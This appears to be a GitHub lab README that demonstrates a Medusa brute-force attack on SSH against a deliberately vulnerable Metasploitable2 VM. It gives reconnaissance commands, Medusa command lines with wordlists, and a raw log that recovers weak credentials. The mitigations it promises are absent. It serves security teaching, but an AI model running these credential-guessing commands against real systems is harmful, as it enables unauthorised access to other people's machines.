
# Medusa Brute Force (SSH Service)

**Project type:** Penetration testing / Vulnerability assessment (Lab environment)

**Target:** Metasploitable2 (vulnerable target VM)

**Tools used:** Medusa, Nmap, netcat, ssh, custom wordlists

**Author:** Pardhasaradhi (you can change this before pushing to GitHub)

---

## Overview

This project demonstrates using **Medusa** to perform a brute-force attack against the SSH service on a deliberately vulnerable machine (Metasploitable2). The goal is to show how weak or reused credentials can be discovered using automated attacks, and to highlight the importance of strong password policies and monitoring in real-world systems.

> **Important:** All testing was performed in a controlled lab environment (Metasploitable2). Do NOT run these techniques against systems you do not own or have explicit permission to test. Unauthorized access is illegal and unethical.

---

## Objective

- Identify whether SSH on the target has weak or guessable credentials.
- Demonstrate how Medusa can be used with custom username and password lists to crack weak SSH logins.
- Produce actionable findings and mitigations to reduce real-world risk.

---

## Lab setup / Environment

- Attacker: Kali Linux (or similar pentest distro)
- Target: Metasploitable2 VM (default network: host-only or NAT, IP assumed `192.168.56.101` in examples)
- Network: Isolated lab network (no internet exposure for the target)

---

## Prerequisites

Install Medusa (on Kali / Debian-based):


sudo apt update
sudo apt install medusa -y
```
Verify medusa is installed:

medusa -h


Create wordlists and username lists (examples in repository):
- `users.txt` — list of usernames to try (one per line)
- `wordlist.txt` — list of passwords to try (one per line)

You can create custom lists using any preferred tooling (crunch, CeWL, or manually).

---

## Reconnaissance (Example)

1. Discover target IP (use `ifconfig`/`ip a` on target or `nmap` from attacker)
```bash
nmap -sS -sV -p 22 192.168.56.0/24
# Example output shows host 192.168.56.101 with port 22 open (ssh)
```

2. Basic banner grab (optional)
```bash
nc -v 192.168.56.101 22
# or
ssh -v user@192.168.56.101
```

---

## Medusa Usage — Commands & Examples

### Single username, single password (quick test)
```bash
medusa -h 192.168.56.101 -u msfadmin -p msfadmin -M ssh
```
- `-h` target host
- `-u` single username
- `-p` single password
- `-M` module (`ssh` in this case)

### Username list and password list (parallelized)
```bash
medusa -h 192.168.56.101 -U users.txt -P wordlist.txt -M ssh -t 4
```
- `-U users.txt` file with usernames (one per line)
- `-P wordlist.txt` file with passwords (one per line)
- `-t 4` number of parallel threads (increase/decrease based on network/target)

### Target with multiple hosts
```bash
medusa -M ssh -U users.txt -P wordlist.txt -h 192.168.56.101,192.168.56.102 -t 6
```
- Comma-separated hosts or use `-H hosts.txt` with file list.

### Save results to a file (redirect)
Medusa prints results to stdout. Capture output to file for reporting:
```bash
medusa -h 192.168.56.101 -U users.txt -P wordlist.txt -M ssh -t 4 | tee medusa_results.txt
```

### Example interpretation of Medusa output
Typical successful line looks like:
```
[22][ssh] host: 192.168.56.101   login: msfadmin   password: msfadmin
```
This indicates Medusa found valid credentials for user `msfadmin` with password `msfadmin` on SSH port 22.

---

## Findings

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-09-13 13:25:31 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: msfadmin (1 of 8, 0 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:25:31 ACCOUNT FOUND: [ssh] Host: 192.168.61.139 User: msfadmin Password: msfadmin [SUCCESS]
2025-09-13 13:25:33 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: msfadmin (1 of 8, 1 complete) Password: 12345 (2 of 11 complete)
2025-09-13 13:25:33 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: msfadmin (1 of 8, 1 complete) Password: qwerty (3 of 11 complete)
2025-09-13 13:25:33 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: msfadmin (1 of 8, 1 complete) Password: admin (4 of 11 complete)
2025-09-13 13:25:38 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:25:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: abc123 (2 of 11 complete)
2025-09-13 13:25:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: admin (3 of 11 complete)
2025-09-13 13:25:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: 12345 (4 of 11 complete)
2025-09-13 13:25:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: qwerty (5 of 11 complete)
2025-09-13 13:25:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: telnet (6 of 11 complete)
2025-09-13 13:25:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: service (7 of 11 complete)
2025-09-13 13:25:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 1 complete) Password: telnet (8 of 11 complete)
2025-09-13 13:25:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 2 complete) Password: user (9 of 11 complete)
2025-09-13 13:25:43 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 2 complete) Password: password (10 of 11 complete)
2025-09-13 13:25:43 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: admin (2 of 8, 2 complete) Password: vagrant (11 of 11 complete)
2025-09-13 13:25:48 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: admin (1 of 11 complete)
2025-09-13 13:25:48 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: msfadmin (2 of 11 complete)
2025-09-13 13:25:50 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: abc123 (3 of 11 complete)
2025-09-13 13:25:50 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: telnet (4 of 11 complete)
2025-09-13 13:25:50 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: 12345 (5 of 11 complete)
2025-09-13 13:25:50 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: qwerty (6 of 11 complete)
2025-09-13 13:25:51 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: service (7 of 11 complete)
2025-09-13 13:25:51 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 2 complete) Password: telnet (8 of 11 complete)
2025-09-13 13:25:51 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 3 complete) Password: user (9 of 11 complete)
2025-09-13 13:25:51 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 3 complete) Password: password (10 of 11 complete)
2025-09-13 13:25:54 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: password (3 of 8, 3 complete) Password: vagrant (11 of 11 complete)
2025-09-13 13:25:58 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:25:58 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: admin (2 of 11 complete)
2025-09-13 13:25:58 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: 12345 (3 of 11 complete)
2025-09-13 13:26:00 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: telnet (4 of 11 complete)
2025-09-13 13:26:00 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: abc123 (5 of 11 complete)
2025-09-13 13:26:00 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: service (6 of 11 complete)
2025-09-13 13:26:01 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: qwerty (7 of 11 complete)
2025-09-13 13:26:02 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 3 complete) Password: user (8 of 11 complete)
2025-09-13 13:26:02 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 4 complete) Password: telnet (9 of 11 complete)
2025-09-13 13:26:02 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 4 complete) Password: password (10 of 11 complete)
2025-09-13 13:26:02 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: 1234 (4 of 8, 4 complete) Password: vagrant (11 of 11 complete)
2025-09-13 13:26:09 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:26:09 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: 12345 (2 of 11 complete)
2025-09-13 13:26:09 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: admin (3 of 11 complete)
2025-09-13 13:26:09 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: qwerty (4 of 11 complete)
2025-09-13 13:26:11 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: abc123 (5 of 11 complete)
2025-09-13 13:26:11 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: telnet (6 of 11 complete)
2025-09-13 13:26:11 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: service (7 of 11 complete)
2025-09-13 13:26:11 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 4 complete) Password: telnet (8 of 11 complete)
2025-09-13 13:26:13 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 5 complete) Password: password (9 of 11 complete)
2025-09-13 13:26:13 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 5 complete) Password: user (10 of 11 complete)
2025-09-13 13:26:13 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: qwerty (5 of 8, 5 complete) Password: vagrant (11 of 11 complete)
2025-09-13 13:26:18 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:26:20 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: 12345 (2 of 11 complete)
2025-09-13 13:26:20 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: qwerty (3 of 11 complete)
2025-09-13 13:26:20 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: admin (4 of 11 complete)
2025-09-13 13:26:20 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: abc123 (5 of 11 complete)
2025-09-13 13:26:22 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: telnet (6 of 11 complete)
2025-09-13 13:26:22 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: telnet (7 of 11 complete)
2025-09-13 13:26:22 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 5 complete) Password: service (8 of 11 complete)
2025-09-13 13:26:22 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 6 complete) Password: user (9 of 11 complete)
2025-09-13 13:26:23 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 6 complete) Password: password (10 of 11 complete)
2025-09-13 13:26:23 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: root (6 of 8, 6 complete) Password: vagrant (11 of 11 complete)
2025-09-13 13:26:28 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:26:30 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: admin (2 of 11 complete)
2025-09-13 13:26:30 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: abc123 (3 of 11 complete)
2025-09-13 13:26:30 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: 12345 (4 of 11 complete)
2025-09-13 13:26:30 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: qwerty (5 of 11 complete)
2025-09-13 13:26:30 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 6 complete) Password: user (6 of 11 complete)
2025-09-13 13:26:30 ACCOUNT FOUND: [ssh] Host: 192.168.61.139 User: user Password: user [SUCCESS]
2025-09-13 13:26:31 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 7 complete) Password: telnet (7 of 11 complete)
2025-09-13 13:26:32 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 7 complete) Password: service (8 of 11 complete)
2025-09-13 13:26:32 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: user (7 of 8, 7 complete) Password: telnet (9 of 11 complete)
2025-09-13 13:26:37 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: msfadmin (1 of 11 complete)
2025-09-13 13:26:38 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: admin (2 of 11 complete)
2025-09-13 13:26:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: 12345 (3 of 11 complete)
2025-09-13 13:26:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: qwerty (4 of 11 complete)
2025-09-13 13:26:39 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: abc123 (5 of 11 complete)
2025-09-13 13:26:40 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: telnet (6 of 11 complete)
2025-09-13 13:26:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: service (7 of 11 complete)
2025-09-13 13:26:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 7 complete) Password: telnet (8 of 11 complete)
2025-09-13 13:26:41 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 8 complete) Password: user (9 of 11 complete)
2025-09-13 13:26:42 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 8 complete) Password: password (10 of 11 complete)
2025-09-13 13:26:43 ACCOUNT CHECK: [ssh] Host: 192.168.61.139 (1 of 1, 0 complete) User: vagrant (8 of 8, 8 complete) Password: vagrant (11 of 11 complete)








